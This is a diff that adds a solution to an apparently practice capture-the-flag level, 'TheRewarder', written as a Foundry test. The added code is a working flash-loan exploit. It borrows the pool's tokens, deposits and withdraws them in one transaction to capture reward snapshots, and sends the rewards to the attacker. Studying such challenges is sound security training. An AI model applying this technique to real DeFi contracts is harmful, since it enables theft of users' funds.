@@ -88,12 +88,21 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
-
+        skip(5 days);
+        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);
+        theRewarderPool.rewardToken().transfer(attacker, theRewarderPool.rewardToken().balanceOf(address(this)));
         /**
          * EXPLOIT END *
          */
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        dvt.approve(address(theRewarderPool), amount);
+        theRewarderPool.deposit(amount);
+        theRewarderPool.withdraw(amount);
+        dvt.transfer(address(flashLoanerPool), amount);
     }
 
     function validation() internal {
